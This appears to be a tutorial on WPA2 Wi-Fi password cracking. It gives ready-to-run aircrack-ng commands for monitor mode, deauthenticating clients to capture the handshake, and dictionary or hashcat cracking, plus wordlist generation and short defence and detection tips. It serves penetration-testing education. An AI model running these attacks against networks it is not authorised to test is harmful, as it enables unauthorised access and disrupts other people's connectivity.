ğŸ¯ Core Tools in the Suite
Tool	Purpose	Command
airmon-ng	Enable monitor mode	airmon-ng start wlan0
airodump-ng	Capture packets	airodump-ng wlan0mon
aireplay-ng	Generate traffic	aireplay-ng --deauth
aircrack-ng	Crack passwords	aircrack-ng capture.cap
airbase-ng	Fake AP setup	airbase-ng -e "FakeAP" wlan0mon
ğŸ“Š WPA2 Handshake Process
ğŸ¤ The 4-Way Handshake
text
Client                            Access Point
   |                                    |
   |<------- ANonce (AP Nonce) ---------|
   |                                    |
   |------ SNonce (Client Nonce) ------>|
   |                                    |
   |<---- GTK + MIC (Message Integrity) |
   |                                    |
   |----- ACK + MIC (Confirmation) ----->|
   |                                    |
ğŸ” What's Captured?
PMK (Pairwise Master Key) - Derived from PSK

ANonce & SNonce - Random numbers

PTK (Pairwise Transient Key) - Session key

MIC (Message Integrity Code) - Proof of key knowledge

ğŸ¯ Ethical WPA2 Testing Methodology
Phase 1: Reconnaissance
bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Capture specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w capture wlan0mon
Phase 2: Handshake Capture
bash
# Deauthenticate client to force reconnection
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:ADDR wlan0mon
Phase 3: Password Cracking
bash
# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  capture-01.cap

# Using hashcat (GPU accelerated)
aircrack-ng -J capture_hash capture-01.cap
hashcat -m 2500 capture_hash.hccapx rockyou.txt
ğŸ“ Wordlist Management
Common Wordlists:
bash
/usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/fasttrack.txt
/usr/share/seclists/Passwords/Common-Credentials/
Create Custom Wordlist:
bash
# Crunch - Generate wordlists
crunch 8 12 -t @@@%%%%%% -o custom.txt

# Cewl - Scrape website for words
cewl https://target.com -d 2 -w words.txt
ğŸ›¡ï¸ Defending Against WPA2 Attacks
Network Hardening:
bash
# 1. Use WPA3 when available
# 2. Implement 802.1X/EAP
# 3. Use strong passwords (>12 chars)
# 4. Enable MAC filtering (limited protection)
# 5. Regular security audits
Detection of Attacks:
bash
# Monitor for deauth floods
sudo tcpdump -i wlan0 -n \
  "type mgt subtype deauth"
